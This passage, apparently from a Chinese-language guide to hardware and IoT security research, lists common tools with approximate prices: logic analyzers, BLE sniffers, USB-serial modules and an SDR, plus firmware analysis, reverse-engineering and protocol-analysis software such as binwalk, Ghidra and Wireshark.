- Saleae Logic Analyzer（逻辑分析仪，约$150-400）
- Ubertooth One（BLE嗅探器，约$100）
- FT232RL / CP2102 USB转串口模块（约$5-15）
- Bus Pirate（通用调试接口，约$30）

**软件工具集**：
- binwalk（固件分析，`apt install binwalk`）
- Firmadyne（固件模拟器）
- Ghidra（NSA开源的逆向分析工具）
- Wireshark（网络协议分析）
- bluepy / bleak（Python BLE库）
- HackRF One（SDR平台，约$300，用于无线信号的收发分析）
